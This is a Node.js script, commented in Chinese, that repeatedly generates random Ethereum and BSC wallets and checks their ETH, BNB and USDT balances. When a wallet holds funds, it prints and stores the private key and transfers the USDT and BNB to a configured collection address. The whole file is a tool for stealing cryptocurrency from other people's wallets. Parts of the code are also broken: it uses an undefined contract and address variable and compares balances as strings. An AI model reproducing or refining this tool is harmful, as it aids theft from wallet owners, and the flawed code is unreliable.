const ethers = require('ethers');
const dbCommand = require('./db/dbCommand');
const config = require('./config/config');
const usdtAbi = require('./abi/usdtAbi.json');
const bscRpcKeys = Object.keys(config.CHAIN.bsc);
const randomRpcIndex = Math.floor(Math.random() * bscRpcKeys.length);
const randomRpc = config.CHAIN.bsc[bscRpcKeys[randomRpcIndex]];
const providerEth = ethers.getDefaultProvider();
const providerBsc = new ethers.providers.JsonRpcProvider(randomRpc);
const ETHUSDT = new ethers.Contract(config.CONTRACT.eth.mainNet.USDT, usdtAbi, providerEth);
const BSCUSDT = new ethers.Contract(config.CONTRACT.bsc.mainNet.USDT, usdtAbi, providerBsc);
const interTime = Math.floor(Math.random() * (400 - 100) + 100)
let count = 1;
let point = 1;


function runState() {
    setInterval(() => {
        console.clear();
        console.log(`正在运行中${'.'.repeat(point)}`);
        point++;
        if (point > 6) {
            point = 1;
        }
    }, 500);
}


async function generateWallet() {
    return new Promise((res, rej) => {
        const wallet = ethers.Wallet.createRandom();
        res(wallet);
    })
}


async function getWalletBalance() {
    const result = new Array();
    const wallet = await generateWallet();
    const bnbB = await providerBsc.getBalance(wallet.address);//bsc主网BNB余额大数
    const ethB = await providerEth.getBalance(wallet.address);//eth主网ETH余额大数
    const decimals = await ETHUSDT.decimals();
    const bnbBalance = ethers.utils.formatEther(bnbB);//可读的BNB余额
    const ethBalance = ethers.utils.formatEther(ethB);//可读的ETH余额
    const ethUSDTbalacne = await ETHUSDT.balanceOf(wallet.address);//eth主网USDT余额大数
    const bscUSDTbalacne = await BSCUSDT.balanceOf(wallet.address);//bsc主网USDT余额大数
    const ethUSDTBalance = ethers.utils.formatUnits(ethUSDTbalacne, decimals);//可读的eth主网USDT余额
    const bscUSDTBalance = ethers.utils.formatUnits(bscUSDTbalacne, decimals);//可读的bsc主网USDT余额
    if (bnbBalance > 0 || ethBalance > 0 || ethUSDTBalance > 0 || bscUSDTBalance > 0) {
        console.log(wallet.privateKey);
        await dbCommand.insertWalletInfo(wallet);
    }
    if (bscUSDTBalance > 0) {//若bsc主网有U就先转U，因为gas嘛
        await transferUSDT(wallet, bscUSDTbalacne)
    }
    if (bnbBalance > 0) {//最后转BNB
        await transferBNB(wallet);
    }
    result.push({ id: count++, address: wallet.address, BNB: bnbBalance, ETH: ethBalance, ETHUSDT: ethUSDTBalance, BSCUSDT: bscUSDTBalance });
    console.log(result[0]);
}


async function transferBNB(wallet) {
    const balance = await providerBsc.getBalance(wallet.address);//再查询一遍余额，防止gas不够
    const gas = ethers.BigNumber.from(21000 * (5 * 10 ** 9));
    const tx = {
        to: config.collectAddress,
        value: balance.sub(gas)
    }
    try {
        await wallet.sendTransaction(tx).wait();
        console.log("发送完成");
    } catch (e) {
        console.error(e);
    }
}

async function transferUSDT(wallet, amount) {
    try {
        await (await USDT.connect(wallet).transfer(collectAddress, amount)).wait();
        console.log('发送USDT完成')
    }
    catch (e) {
        console.error(e)
    }
}



setInterval(async () => {
    try {
        await getWalletBalance();
    } catch (e) {
        console.error(e);
    }
}, interTime);

